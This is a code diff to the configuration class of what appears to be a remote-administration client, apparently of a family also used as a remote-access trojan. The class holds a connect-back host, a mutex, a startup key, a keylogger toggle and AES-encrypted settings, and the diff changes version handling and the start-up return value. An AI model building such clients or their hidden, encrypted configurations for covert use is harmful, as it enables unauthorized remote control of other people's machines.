@@ -10,7 +10,7 @@ namespace xClient.Config
     public static class Settings
     {
 #if DEBUG
-        public static string VERSION = "1.0.0.0d";
+        public static string VERSION = System.Windows.Forms.Application.ProductVersion;
         public static string HOSTS = "localhost:4782;";
         public static int RECONNECTDELAY = 500;
         public static string PASSWORD = "1234";
@@ -26,12 +26,13 @@ namespace xClient.Config
         public static bool ENABLELOGGER = false;
         public static string TAG = "DEBUG";
 
-        public static void Initialize()
+        public static bool Initialize()
         {
             FixDirectory();
+            return true;
         }
 #else
-        public static string VERSION = "1.0.0.0r";
+        public static string VERSION = "";
         public static string HOSTS = "localhost:4782;";
         public static int RECONNECTDELAY = 5000;
         public static string PASSWORD = "1234";
@@ -48,8 +49,9 @@ namespace xClient.Config
         public static string ENCRYPTIONKEY = "ENCKEY";
         public static string TAG = "RELEASE";
 
-        public static void Initialize()
+        public static bool Initialize()
         {
+            if (string.IsNullOrEmpty(VERSION)) return false;
             AES.PreHashKey(ENCRYPTIONKEY);
             TAG = AES.Decrypt(TAG);
             VERSION = AES.Decrypt(VERSION);
@@ -60,6 +62,7 @@ namespace xClient.Config
             MUTEX = AES.Decrypt(MUTEX);
             STARTUPKEY = AES.Decrypt(STARTUPKEY);
             FixDirectory();
+            return true;
         }
 #endif
 
